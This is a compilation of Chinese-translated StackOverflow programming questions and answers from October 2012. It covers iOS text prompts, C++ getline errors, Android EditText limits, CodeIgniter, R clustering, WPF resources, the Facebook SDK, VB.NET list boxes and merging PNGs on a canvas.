# StackOverflow 问答 12760000-12760999

# ios - 如何在 CGContext 中绘制提示用户的文本

> ID：12760003
> 
> 赞同：-1
> 
> 时间：2012-10-06T12:56:22.847
> 
> 标签：ios, text, draw, cgcontext

我想在 CGContext 中绘制文本。当我从字符串中写入文本时，我会绘制文本。但我想提示用户这个文本。我能怎么做？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-06T15:33:06.023

你可以使用 UIAlertView 来做到这一点：

```
UIAlertView* alert = [[UIAlertView alloc] init];
alert.message = @"Enter new string";
alert.alertViewStyle = UIAlertViewStylePlainTextInput;
UITextField* textField = [alert textFieldAtIndex:0];
textField.placeholder = @"text";

[alert addButtonWithTitle:@"Cancel"];
[alert addButtonWithTitle:@"OK"];
alert.cancelButtonIndex = 0;
alert.delegate = self;
[alert show]; 
```

处理“确定”按钮按下：

```
-(void)alertView:(UIAlertView *)alertView clickedButtonAtIndex:(NSInteger)buttonIndex
{
    if (alertView.cancelButtonIndex != buttonIndex) {
        NSString* text = [alertView textFieldAtIndex:0].text;
        [self.myView setString:text];

    }
} 
```

您的自定义视图的方法`setString:`应该设置它的 NSString ivar 并调用`[self setNeedsDisplay]`或 - 如果您知道绘制字符串的框架 - 更好的调用`[self setNeedsDisplayInRect:stringFrame]`。

# java - java - 如何使用Java将msExel文件中的特定值读入变量？

> ID：12760008
> 
> 赞同：-3
> 
> 时间：2012-10-06T12:56:54.237
> 
> 标签：java, csv

将 msExel 文件中的特定元素读入变量的简单方法是什么？

**例如**text.xls

```
+-----+-----+-----+-----+-----+
|  A  |  B  |  C  |  D  |  E  |
+-----+-----+-----+-----+-----+
|  1  |  2  |  3  |  4  |  5  |
+-----+-----+-----+-----+-----+
|  6  |  7  |  8  |  9  |  10 | <-
+-----+-----+-----+-----+-----+ 
```

如何将 10 读入变量？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-06T13:00:13.923

您必须使用诸如[Apache POI](http://poi.apache.org/)或[JExcelApi](http://jexcelapi.sourceforge.net/)之类的 API 。有很多[很好的例子](http://www.javaworld.com/javaqa/2002-05/01-qa-0503-excel3.html)可用。

# c++ - 使用 getline 获取字符串对象

> ID：12760010
> 
> 赞同：1
> 
> 时间：2012-10-06T12:57:16.933
> 
> 标签：c++, string, getline

我正在尝试使用 getline 将用户输入直接从控制台获取到 C++ 字符串对象中。但是我没有这样做，因为编译器给了我以下错误。

```
main.cpp: In function ‘int main(int, char**)’:
main.cpp:52:28: error: no matching function for call to ‘std::basic_ifstream<char>::getline(std::ifstream&, std::string&)’
main.cpp:52:28: note: candidates are:
/usr/include/c++/4.6/istream:599:5: note: std::basic_istream<_CharT, _Traits>& std::basic_istream<_CharT, _Traits>::getline(std::basic_istream<_CharT, _Traits>::char_type*, std::streamsize, std::basic_istream<_CharT, _Traits>::char_type) [with _CharT = char, _Traits = std::char_traits<char>, std::basic_istream<_CharT, _Traits>::char_type = char, std::streamsize = int]
/usr/include/c++/4.6/istream:599:5: note:   candidate expects 3 arguments, 2 provided
/usr/include/c++/4.6/istream:408:7: note: std::basic_istream<_CharT, _Traits>::__istream_type& std::basic_istream<_CharT, _Traits>::getline(std::basic_istream<_CharT, _Traits>::char_type*, std::streamsize) [with _CharT = char, _Traits = std::char_traits<char>, std::basic_istream<_CharT, _Traits>::__istream_type = std::basic_istream<char>, std::basic_istream<_CharT, _Traits>::char_type = char, std::streamsize = int]
/usr/include/c++/4.6/istream:408:7: note:   no known conversion for argument 2 from ‘std::string {aka std::basic_string<char>}’ to ‘int’ 
```

这是源代码：

```
#include <iostream>
 #include <fstream>
 #include <cmath>
 #include <cstdlib>
 #include <cstring>
 #include <string>
 #include <map>
 #include <set>
 #include <algorithm>
 #include <cstdio>

 #define MAX_LIN 1024

 using namespace std;

 typedef set<int> si;
int main(int argc, char** argv)
 {   
     string line1;
     string line2;

     map <string , si > iMap;

     if (argc != 3) { 
         fprintf(stderr,"Usage: a.out <file1> <file2>\n");
     }

     ifstream f1,f2;

     f1.open(argv[1],ifstream::in);
     f2.open(argv[2],ifstream::in);

     while(!f1.eof()) {
         getline(f1,line1);
         mParse(line1);
     }   

     while(!f2.eof()) {
         f2.getline(f2,line2);
         mParse(line2);
     }   

     f1.close();
     f2.close();

     return 0;
 } 
```

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-10-06T13:01:06.393

这是原因：

```
f2.getline(f2,line2); 
```

应该：

```
getline(f2,line2); 
```

有一个[`std::ifstream::getline()`](http://en.cppreference.com/w/cpp/io/basic_istream/getline)但它接受不同的论点。

请注意，`while`循环的结构不正确，`eof()`应在读取操作后立即检查。编码循环的常用方法是：

```
while (getline(f2, line2))
{
    mParse(line2);
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-10-06T13:01:20.837

这是规范的方式：

```
 std::ifstream f1(argv[1]);
 std::ifstream f2(argv[2]);

 for (std::string line; std::getline(f1, line); )
 {
     mparse(line);
 }

 for (std::string line; std::getline(f2, line); )
 {
     mparse(line);
 } 
```

注意我们**不**写的所有内容，每一个都应该被视为大罪：`eof`, `open`, `close`, `ifstream::in`, `return 0`.

# android - 在android中指定编辑文本中的字符数

> ID：12760016
> 
> 赞同：2
> 
> 时间：2012-10-06T12:58:21.857
> 
> 标签：android, layout, android-edittext

我有一个关于如何限制 android 中的字符数的小技巧。`edit text`例如，我想为名称字段设置 10 个字符的限制，因此它不允许用户输入超过 10 个字符。

此外，我在指定`inputtype`for 文本时遇到了另一个问题，我知道该过程，`android:inputType="text|textPersonName"`但它不起作用，因为它允许用户输入字符、数字和特殊字符。

我将非常感谢您的帮助。

提前致谢

* * *

## 回答 #1

> 赞同：10
> 
> 时间：2012-10-06T14:42:55.753

使用以下 xml 属性设置允许的最大字符和位数

```
android:digits
android:maxLength 
```

例如：

```
<EditText
android:id="@+id/et_name"
android:layout_width="100dp"
android:layout_height="wrap_content"
android:digits="abcdefghijklmnopqrstuvwxyz ."
android:maxLength="10" /> 
```

在这里，这仅允许小写字母、空格和点 (.)

**更新**

通过java设置过滤器

```
InputFilter myFilter = new InputFilter() { 
        public CharSequence filter(CharSequence source, int start, int end, 
Spanned dest, int dstart, int dend) { 
                for (int i = start; i < end; i++) { 

                        if (!Character.isLetter(source.charAt(i))) { 
                                return ""; 
                        } 

                        if (i == start) {
                           return source.toUpperCase();
                        }

                } 
                return source; 
        } 
}; 

edit.setFilters(new InputFilter[]{myFilter}); 
```

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2016-10-04T12:37:16.203

```
android:maxLength="10" 
```

这对我有用。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-10-06T13:00:21.277

尝试这个：

```
android:maxLength="10" 
```

在 XML 文件中的 EditText 中。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-10-06T13:14:05.140

对于第一部分，您要做的是编写：

```
android:maxLength="10" 
```

就你的第二个问题而言，只写 textPersonName 就足够了

```
android:inputType="textPersonName" 
```

如此处所引用的[输入类型](http://developer.android.com/reference/android/widget/TextView.html#attr_android%3ainputType)

仅在以编程方式执行时才必须使用位标志，这对应于：

```
 setInputType(InputType.TYPE_CLASS_TEXT  | InputType. TYPE_TEXT_VARIATION_PERSON_NAME); 
```

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2012-10-06T13:16:50.713

为了设置你应该使用的字符数的限制，因为已经发布

```
android:maxLength="10" 
```

在 XML 文件中的 EditText 中。如果您希望用户仅限于字母，那么您将必须在 JAVA 代码中创建一个自定义输入过滤器，如下所示

```
InputFilter filter = new InputFilter() { 
        public CharSequence filter(CharSequence source, int start, int end, 
Spanned dest, int dstart, int dend) { 
                for (int i = start; i < end; i++) { 
                        if (!Character.isLetter(source.charAt(i))) { 
                                return ""; 
                        } 
                } 
                return null; 
        } 
}; 

edit.setFilters(new InputFilter[]{filter}); 
```

代码取自[这里](https://stackoverflow.com/questions/3349121/how-do-i-use-inputfilter-to-limit-characters-in-an-edittext-in-android)。

* * *

## 回答 #6

> 赞同：1
> 
> 时间：2017-08-12T06:24:25.993

**android工作中的手机号码第一个字符只有7、8、9位数字**

源代码

[https://drive.google.com/open?id=0BzBKpZ4nzNzUQkU3S25fcXV4cEE](https://drive.google.com/open?id=0BzBKpZ4nzNzUQkU3S25fcXV4cEE)

在 android 中编辑文本中的第一个字母以 7,8,9 开头

```
package com.keshav.mobilenumberrestriction_1_6_digits;

import android.support.v7.app.AppCompatActivity;
import android.os.Bundle;
import android.text.Editable;
import android.text.InputFilter;
import android.text.Spanned;
import android.text.TextWatcher;
import android.widget.EditText;

public class MainActivity extends AppCompatActivity {

    EditText et_mobile_feedback;
    String blockCharacterSet = "1234560";

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        et_mobile_feedback = (EditText) findViewById(R.id.et_mobile_feedback);

        et_mobile_feedback.setFilters(new InputFilter[] { filter });

        et_mobile_feedback.addTextChangedListener(new TextWatcher() {

            public void afterTextChanged(Editable s) {
                // you can call or do what you want with your EditText here
            }

            public void beforeTextChanged(CharSequence s, int start, int count, int after) {}

            public void onTextChanged(CharSequence s, int start, int before, int count) {
                if(et_mobile_feedback.getText().toString().length()==0)
                    blockCharacterSet="1234560";
                else
                    blockCharacterSet="";
                if(et_mobile_feedback.getText().toString().length()==10)
                    blockCharacterSet="1234567890";
            }
        });
    }
    private InputFilter filter = new InputFilter() {

        @Override
        public CharSequence filter(CharSequence source, int start, int end, Spanned dest, int dstart, int dend) {

            try {
                if (source != null && blockCharacterSet.contains("" + source.charAt(0))) {
                    return "";
                }
            }catch (StringIndexOutOfBoundsException e){

            }
            return null;
        }
    };
}

    <EditText
        android:id="@+id/et_mobile_feedback"
        android:layout_width="fill_parent"
        android:layout_height="wrap_content"
        android:layout_marginTop="5dp"
        android:editable="true"
        android:fontFamily="sans-serif"
        android:gravity="top"
        android:hint="Mobile"
        android:textColor="@color/colorPrimary"
        android:inputType="number"
        android:maxLength="10"
        android:padding="15dp"
        android:paddingLeft="10dp"
        android:paddingRight="10dp"
        android:paddingTop="10dp"
        android:singleLine="true"> 
```

* * *

## 回答 #7

> 赞同：1
> 
> 时间：2017-09-05T12:48:23.313

xml中的简单方法：

如果您需要在编辑文本中设置 4 个字符，请使用此

```
android:maxLength="4" 
```

# asp.net-mvc - 什么可能导致我所有的 Infragistics jQuery 网格在新的开发机器上中断？

> ID：12760024
> 
> 赞同：0
> 
> 时间：2012-10-06T12:59:52.147
> 
> 标签：asp.net-mvc, asp.net-mvc-4, infragistics

我有一个使用多个 Infragistics jQuery igGrid 小部件的 MVC4 应用程序。直到周三早上，这个应用程序运行得非常好。然后我备份了这个项目，并在一台新机器上恢复了它。我还重新安装了 while Infragistics jQuery 套件，尽管这不是必需的，因为没有 GAC 依赖项。

现在，在我的应用程序的任何网格上，我得到一个“索引超出范围。必须是非负数并且小于集合的大小。” 当网格尝试在定义网格的 Razor 标记行上呈现时出现异常。堆栈跟踪是：

```
at System.ThrowHelper.ThrowArgumentOutOfRangeException()
at System.Collections.ObjectModel.Collection`1.set_Item(Int32 index, T value)
at Infragistics.Web.Mvc.GridModel.DataBindInternal()
at Infragistics.Web.Mvc.GridModel.DataBind()
at Infragistics.Web.Mvc.Grid`1.DataBind()
at ASP._Page_Areas_Author_Views_Course_Index_cshtml.Execute() in c:\Development\Educ8\Educ8.Mvc\Areas\Author\Views\Course\Index.cshtml:line 16 
```

这对应用程序中的每个网格都很常见，并不是因为数据源已更改并且缺少列或其他原因。一个示例网格定义是：

```
<section class="index">
    @{
        var grid = Html.Infragistics().Grid(Model.Items.AsQueryable())
            .ID("indexGrid")
            .AutoGenerateColumns(false)
            .PrimaryKey("Id")
            .Height(Model.GridHeight)
            .Columns(col =>
                         {
                             col.For(m => m.Id).HeaderText("Id").Hidden(true);
                         }).DataBind();
    }
    @grid.Render()
</section> 
```

在这里，我删除了除 Id 之外的所有列，我已确认它存在于数据源中。

**更多：** 回顾我的 Git 提交，我发现当我在 web.config 中加密我的连接字符串时出现了这个问题。加密代码将`configProtectionProvider="DataProtectionConfigurationProvider"`属性添加到该`connectionStrings`部分。编辑抱怨这个属性是不允许的，所以我把这个`xmlns="http://schemas.microsoft.com/.NetConfiguration/v2.0"`属性添加到了这个`configuration`部分。正是这最后一个属性的存在触发了电网故障。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-07T08:44:34.550

你说

```
`I then backed up the project, and restored it on a new machine.` 
```

但是，据我所知，用于加密和解密密码值的 MachineKey 值特定于原始机器。因此，当您将代码从一台机器移动到另一台机器时，MachineKey 是不同的，您无法解密配置文件。我认为您需要重新加密新机器上的连接字符串。这将使用本地加密密钥。

也许[这篇文章](http://www.codeproject.com/Articles/18558/Encrypting-windows-application-connection-strings)可能会有所帮助。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-10-06T16:49:56.943

可能 Items 集合为空。

尝试使用该`Model.Items`对象作为网格数据源，而不是`Model.Items.AsQueryable()`.

# magento - 如何使用属性值而不是标签在 Magento 中获取产品

> ID：12760025
> 
> 赞同：0
> 
> 时间：2012-10-06T12:59:52.207
> 
> 标签：magento

```
$this->_productCollection = Mage::getModel('catalog/product')->getCollection()
->addAttributeToFilter('manufacturer',array(
    "eq",'43') 
                                           )
                      ); 
```

这会根据属性的 id（一个数字）获取某个制造商的产品。

如何修改它以获取某个制造商（或属性）的产品，但使用属性的值，而不是 id？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-06T17:02:11.820

你可以试试这个，->addFieldToFilter(array(array('attribute'=>'manufacturer','eq'=>'ABC')

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-10-06T16:38:09.133

尝试

```
 $manufacturer_name = 'xyz';
    $product = NULL;
    $manufacturer_id = NULL;

    $manufacturers  = Mage::getModel('eav/config')->getAttribute('catalog_product','manufacturer')->getSource()->getAllOptions(false,true);

    foreach($manufacturers as $m){
       if(strtolower($m['label']) == strtolower($manufacturer_name)){
          $manufacturer_id = $m['value'];
          continue;
       } 
    }

   if($manufacturer_id){
     $product = Mage::getModel('catalog/product')->loadByAttribute('manufacturer', $manufacturer_id);  
   }

   print_r($product); 
```

# r - 与 r 中的缺失或错误组合

> ID：12760030
> 
> 赞同：3
> 
> 时间：2012-10-06T13:00:22.123
> 
> 标签：r, dataframe, permutation, combinations

我必须创建独特的组合，同时允许一些不匹配。下面是一个例子：

```
set.seed (1234)
dataf <- data.frame (var1 = sample( c("A", "B", "-"),20, replace = T),
            var2 = sample( c("A"),20, replace = T),
            var3 = sample( c("B", "B", "B", "-"),20, replace = T),
            var4 = sample( c("A","A", "A",  "-"),20, replace = T),
            var5 = sample( c("A", "B", "A", "A", "-"),20, replace = T)
            )
 dataf 
```

规则：

(1) 生成唯一组合：

```
 A B     A  B  B   - combination 1
    A  A     A  B  B    - combination 2
    B  B     B  A  A    - combination 3 
   so on ... 
```

（2）允许一个（可以是n个）不匹配来创建一个类别。例如：

```
A   B    A  B  B
A   A    A  B  B
B   A    A  B  B
B   A    B  B  B 
B   A    A  B  A 
```

与在不同变量处存在单个不匹配相同。

(3) “-”表示缺失值，可以视为匹配中的整数，表示允许一个不匹配。

```
A   B    A  B  B
 A   -    A  B  B
 A   B    A  -  B 
```

但是，如果有两个缺失值，则组合被声明为未知 (-)

```
 A   B    A  B  B
 A   -    A  -  B
 A   B    A  -  - 
```

以下是对上述数据的锻炼。

```
 var1 var2 var3 var4 var5       comb
1     A    A    B    -    -       -

2     B    A    B    A    A        1
3     B    A    B    A    A        1
4     B    A    B    A    A        1
5     -    A    B    A    A        1
6     B    A    B    A    -        1

7     A    A    B    A    B        2
8     A    A    B    A    B        2

9     B    A    B    A    A        1

10    B    A    -    A    -        -

11    -    A    B    A    A        1

12    B    A    B    -    -        -

13    A    A    B    A    A        2

14    -    A    B    -    A        -

15    A    A    B    A    A        2
16    -    A    B    A    A        2
17    A    A    B    A    B        2

18    A    A    -    A    A        3

19    A    A    B    A    B        2

20    A    A    -    A    A        3 
```

任何的想法 ？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-06T17:26:28.803

这是我将如何做到的。这个想法是创建一个距离矩阵，因此您可以将数据聚集成多组行，这些行之间的距离为零。

首先，让我们（暂时）删除具有两个或多个破折号的行：

```
two.dashes <- apply(dataf, 1, function(x)sum(x == '-') >= 2)
subdata <- dataf[!two.dashes,] 
```

然后，让我们计算一个距离矩阵。

```
mydist.fun <- function(i, j, x = subdata) {
   row.i <- x[i, ]
   row.j <- x[j, ]
   idx   <- row.i != '-' & row.j != '-'
   sum(row.i[idx] != row.j[idx])
}
rows.idx  <- seq_len(nrow(subdata))
rows.dist <- as.dist(outer(rows.idx, rows.idx, Vectorize(mydist.fun))) 
```

然后，让我们使用聚类对数据进行分组。我正在使用完整的层次聚类并将其切割为`height = 0`，即，它创建的点组之间的距离均为零。

```
hc <- hclust(rows.dist)
members <- cutree(hc, h = 0) 
```

让我们把所有东西放在一起：

```
comb <- rep('-', nrow(dataf))
comb[!two.dashes] <- members
dataf$comb <- comb
dataf
#    var1 var2 var3 var4 var5 comb
# 1     A    A    B    -    -    -
# 2     B    A    B    A    A    1
# 3     B    A    B    A    A    1
# 4     B    A    B    A    A    1
# 5     -    A    B    A    A    1
# 6     B    A    B    A    -    1
# 7     A    A    B    A    B    2
# 8     A    A    B    A    B    2
# 9     B    A    B    A    A    1
# 10    B    A    -    A    -    -
# 11    -    A    B    A    A    1
# 12    B    A    B    -    -    -
# 13    A    A    B    A    A    3
# 14    -    A    B    -    A    -
# 15    A    A    B    A    A    3
# 16    -    A    B    A    A    1
# 17    A    A    B    A    B    2
# 18    A    A    -    A    A    3
# 19    A    A    B    A    B    2
# 20    A    A    -    A    A    3 
```

这暴露了您预期输出中的矛盾。例如，第 7 行和第 13 行不应属于同一组。此外，还有一些带有单个破折号的行可以转到不同的组，例如第 16 行。

# database - 获取 codeigniter 数据库名称

> ID：12760032
> 
> 赞同：16
> 
> 时间：2012-10-06T13:00:27.243
> 
> 标签：database, codeigniter

我想在 codeigniter 中创建一个数据库备份工具。所以我想从控制器中获取数据库名称。我该怎么做。感谢您的任何回答。

* * *

## 回答 #1

> 赞同：46
> 
> 时间：2012-10-06T14:04:57.500

只使用数据库驱动程序对象中的公共变量？

```
$this->db->database; 
```

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2014-02-17T14:40:31.030

在 codeigniter 中获取当前（活动）数据库就足够了

```
 echo $this->db->database; 
```

* * *

## 回答 #3

> 赞同：4
> 
> 时间：2016-10-21T13:38:21.880

我们可以在 codeigniter 中轻松获取数据库详细信息。

只需使用以下代码并打印此代码，您将获得所有与数据库相关的信息：-

```
print_r($this->db); 
```

您可以像下面这样使用它：-

```
$this->db->database

$this->db->hostname

$this->db->username

$this->db->password 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-10-06T13:20:12.533

1.  一种方法是添加您的配置。

    $config['mydbname'] ='mydatabasename';

并在您的控制器中调用它。

```
$mydb=$this->config->item('mydbname');
$data['mydb']=$mydb;
$this->load->view('myview',$data);// it is not a good idea to show it in view. 
```

2.[使用数据库实用程序类](http://codeigniter.com/user_guide/database/utilities.html)。

```
// use $this->dbutil->list_databases();

//Returns an array of database names:

$dbs = $this->dbutil->list_databases();

foreach ($dbs as $db)
{
    echo $db;
} 
```

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2020-09-03T07:19:35.697

如果你想看看你把代码放在哪里，那么你可以使用这个：

```
var_dump($this->db->database); 
```

# c# - WPF 图像相对位置

> ID：12760040
> 
> 赞同：0
> 
> 时间：2012-10-06T13:02:02.803
> 
> 标签：c#, wpf

我有 WPF 项目，在项目中我有一个文件夹调用`Images`，它包含一些 png 和 gif 文件。其中的所有文件都是`Build Action= Resources`并复制到`Output Directory = Do not copy`.

我使用以下代码将其绑定到图像：

```
ImageSource ImageStatus = new BitmapImage(new Uri("/MPAL;component/Images/usbreader0001.png", UriKind.Relative)); 
```

`MPAL`是我的项目名称和默认程序集。

我有一个问题，图像编译到哪里？因为我能够在没有任何问题的情况下运行它。

我称它为正确的方法吗？

谢谢你。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-10-06T13:16:16.547

Build Action = Resources 将图像放在名为*projectname* .g.resources 的文件中。该资源文件在编译时链接到您的 exe。

# .net - 使用 facebook c# SDK 撤销 facebook 权限

> ID：12760047
> 
> 赞同：0
> 
> 时间：2012-10-06T13:03:23.713
> 
> 标签：.net, c#-4.0, facebook-graph-api, facebook-c#-sdk

是否可以使用后面的代码撤销用户权限？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-03T18:05:37.323

是的：

```
var fb = new FacebookClient(accessToken);
var res = fb.Delete("me/permissions");

if (res is bool && (bool)res == true)
{
    // Facebook access token has been successfully revoked
} 
```

查看官方文档：[https ://developers.facebook.com/docs/reference/api/user/#permsdelete](https://developers.facebook.com/docs/reference/api/user/#permsdelete)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-10-14T10:25:41.277

检查这个：

```
 var fbContext = FacebookContext.Current;
        fbContext.Application = new FacebookApplication()
        {
            AppId = ### ,
            AppSecret = ###
        };

        fbContext.Authorize(
            new string[] {"user_likes","email",..},
            {AppUrl},
            {TabUrl}
        ); 
```

# .net - VB.NET 列表框项切换

> ID：12760049
> 
> 赞同：-3
> 
> 时间：2012-10-06T13:03:48.667
> 
> 标签：.net, vb.net

我正在处理这个项目，我在列表框中有 IP 地址，并且我已经获得了一种将列表框项目传输到文本框的方法，但我需要通过按钮更改 IP 地址。

例如，我有这三个 IP 地址：

*   123.456.78
*   891.23.45.6
*   789.123.12

文本框中的当前 IP 地址是 123.456.78，但是当我单击一个按钮时，它也更改了第二行，即 891.23.45.6，它只能是文本框中的那个（不像 123.456.78 被推到一边）。

这就是我需要的代码。

它全部放在一个按钮下，例如 -

```
Private Sub Button1_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button1.Click

    ''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
    '*Grabbing our proxy text from our online server (this way we can keep updating our proxies).
    Dim Str As System.IO.Stream
    Dim srRead As System.IO.StreamReader
    Try
        ' make a Web request
        Dim req As System.Net.WebRequest = System.Net.WebRequest.Create("https://dl.dropbox.com/somethingOrOther")
        Dim resp As System.Net.WebResponse = req.GetResponse
        Str = resp.GetResponseStream
        srRead = New System.IO.StreamReader(Str)
        ' read all the text 
        TextBox2.Text = srRead.ReadToEnd
    Catch ex As Exception
        TextBox2.Text = "Unable to download content"
    Finally
        '  Close Stream and StreamReader when done
        srRead.Close()
        Str.Close()
    End Try

    ' Assign string to reference.
    Dim value1 As String = TextBox2.Text

    ' Replace word with another word.
    Dim value2 As String = value1.Replace("<br>", vbNewLine)
    TextBox2.Text = value2
    ListBox1.Items.Add(TextBox2.Text)

    '*Now , we're taking our fresh proxies in the textbox and moving them into our listbox.

    ListBox1.Items.AddRange(TextBox2.Text.Split(vbNewLine))
End Sub 
```

有人可以帮我吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-06T13:25:08.743

试试[`ListBox.SelectedIndex`](http://msdn.microsoft.com/en-us/library/system.windows.forms.listbox.selectedindex.aspx)物业。

如果您需要检查特定索引处的值是什么，您可以使用[`ListBox.Items`](http://msdn.microsoft.com/en-us/library/system.windows.forms.listbox.items.aspx)属性。

如果您需要遍历列表框（例如，查找特定值），则可以使用该[`ListBox.Items.Count`](http://msdn.microsoft.com/en-us/library/system.windows.forms.listbox.objectcollection.count.aspx)属性：

```
For l_currentIndex As Integer = 0 to MyListBox.Items.Count - 1
    If CStr(MyListBox.Items(l_currentIndex)) = "MyExpectedValue" Then
        MyListBox.SelectedInex = l_currentIndex
        Exit ' Exit For Loop
    End If
Next 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-10-06T13:35:02.977

这段代码：

```
'Assign string to reference.
Dim value1 As String = TextBox2.Text

'Replace word with another word.
Dim value2 As String = value1.Replace("<br>", vbNewLine)
TextBox2.Text = value2
ListBox1.Items.Add(TextBox2.Text)

'*Now , we're taking out fresh proxies in the textbox and moving them into our listbox

ListBox1.Items.AddRange(TextBox2.Text.Split(vbNewLine)) 
```

在功能上等同于以下代码：

```
TextBox2.Text = TextBox2.Text.Replace("<br>", vbNewLine)
ListBox1.Items.Add(TextBox2.Text)
ListBox1.Items.AddRange(TextBox2.Text.Split(vbNewLine)) 
```

该行`ListBox1.Items.AddRange(TextBox2.Text.Split(vbNewLine))`不会执行您想要的操作，因为您已经将所有`vbNewLine`s替换为`<br>`元素（顺便说一下，这些元素对于 XHTML 格式不正确......它们应该是`<br />`......）。

如果您可以发布整个 button.click 处理程序，用通用信息代替敏感内容（例如您的 Dropbox 网址），我们或许可以更好地为您提供帮助。

**更新：**

假设您的表单标记如下所示：

```
<asp:ListBox ID="ListBox1" runat="server" SelectionMode="Single" AutoPostBack="true"></asp:ListBox>
<asp:TextBox ID="TextBox2" runat="server"></asp:TextBox>
<asp:Button ID="Button1" runat="server" Text="Get Proxies" /> 
```

为您的处理程序尝试这些：

```
Private Sub Button1_Click(sender As Object, e As System.EventArgs) Handles Button1.Click
    Dim req As System.Net.WebRequest = Nothing
    Dim resp As System.Net.WebResponse = Nothing
    Dim Str As System.IO.Stream = Nothing
    Dim srRead As System.IO.StreamReader = Nothing
    Dim responseText As String = String.Empty
    Dim proxies() As String = Nothing
    Dim list As ArrayList = Nothing
    Dim ipAddress As String = String.Empty
    ''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
    '*Grabbing our proxy text from our online server (this way we can keep updating our proxies).
    Try
        ' make a Web request
        req = System.Net.WebRequest.Create("https://dl.dropbox.com/somethingOrOther")
        resp = req.GetResponse
        Str = resp.GetResponseStream
        srRead = New System.IO.StreamReader(Str)
        ' read all the text 
        responseText = srRead.ReadToEnd
    Catch ex As Exception
        responseText = "Unable to download content"
    Finally
        ' Close Stream and StreamReader when done
        srRead.Close()
        Str.Close()
    End Try

    '*Now , we're taking our fresh proxies in the textbox and moving them into our listbox.
    proxies = responseText.Split(vbNewLine)
    For Each ipAddress In proxies
        list.Add(New ListItem(ipAddress))
    Next

    ListBox1.Items.AddRange(list.ToArray(GetType(ListItem)))
End Sub

Private Sub ListBox1_SelectedIndexChanged(sender As Object, e As System.EventArgs) Handles ListBox1.SelectedIndexChanged
    If ListBox1.SelectedIndex > -1 Then
        TextBox2.Text = ListBox1.SelectedValue
    End If
End Sub 
```

# java - facebook-graph-api ，数组列表和重复

> ID：12760052
> 
> 赞同：0
> 
> 时间：2012-10-06T13:04:02.873
> 
> 标签：java, android, facebook-graph-api

我有一个事件 id 列表`eid1,eid2,eid3....`这些事件的创建者有一个用户 id`uid1,uid1,uid2,...` 多个事件 id 可以有相同的用户 id。现在我正在尝试获取与用户 ID 关联的用户名。需要注意的是，uid1,uid1,uid2,... 的顺序很重要，因为我的最终目标是获取每个事件 ID 的用户创建者名称。

如果我查询 facebook：从 uid 所在的用户中选择名称（uid1，uid1，uid2）

它返回

```
username1
username2 
```

但我需要它返回

```
username1
username1
username2 
```

这样我以后就可以将它与我的事件 ID 匹配并在列表视图中显示它。

我也试过 select name,host from event where eid in (select eid from event_member where uid=me() 但主机似乎总是为空。有没有办法解决这个问题？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-06T13:37:17.630

*   使用`Collection`框架。

*   如果顺序/顺序很重要，请使用`List`.

例如：

```
List<String> arList =          // put your response here 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-10-06T15:29:16.453

保存您的清单。创建具有唯一 uid 的新列表（或地图）。根据唯一的 uid 从 facebook 获取答案。使用您的原始列表来安排答案。

# javascript - 如何使用javascript在客户端将2个png图像合并为1个？

> ID：12760053
> 
> 赞同：1
> 
> 时间：2012-10-06T13:04:13.043
> 
> 标签：javascript, image, canvas, png, sprite

所以我的客户端代码收到两个 PNG 图像。其中之一是半透明的。如何将第一个图像与第二个图像叠加并将其转换为第三个 PNG 文件以供以后使用？它喜欢将它们用作图层来制作 1 张 PNG 图像。有没有办法做到这一点或任何框架？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-07T08:00:30.967

它*真的很*容易做到。您只需要使用`drawImage`将图像分层绘制到画布上。至于保存，您使用`toDataURL`它将返回图像的base64 url​​，然后您可以使用它做任何事情，在新窗口中打开等。但是图像*必须*来自代码运行的域才能获取数据url，否则将引发安全异常。jsfiddle 示例引发了安全异常，因为我只是从两个随机网站中提取图像作为示例。

```
var canvas = document.getElementById("canvas"),
    ctx = canvas.getContext("2d"),
    image = document.getElementsByTagName("img");

canvas.width = 400;
canvas.height = 400;
ctx.drawImage(image[0],0,0);
ctx.drawImage(image[1],0,0);

// will raise security exception if not from the same domain as the code.
var newImage = canvas.toDataURL();
​ 
```

**[现场演示](http://jsfiddle.net/loktar/kuPPa/)**

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-10-06T13:07:29.480

[**Pixastic**](http://www.pixastic.com/)是一个 JavaScript 库，它允许您使用一点 JavaScript 对图像执行各种操作、过滤器和精美效果。要了解有关该库的更多信息，请参阅[介绍页面](http://www.pixastic.com/lib/)。

[**CamanJS**](http://camanjs.com/)的主要重点是使用 HTML5 画布和 Javascript 操作图像。它结合了简单易用的界面和先进高效的图像/画布编辑技术。它也完全独立于库，可以在 jQuery、YUI、Scriptaculous、MooTools 等旁边安全使用。

# asp-classic - 使用 ASP 的购物车

> ID：12760056
> 
> 赞同：0
> 
> 时间：2012-10-06T13:04:46.513
> 
> 标签：asp-classic, e-commerce, shopping-cart

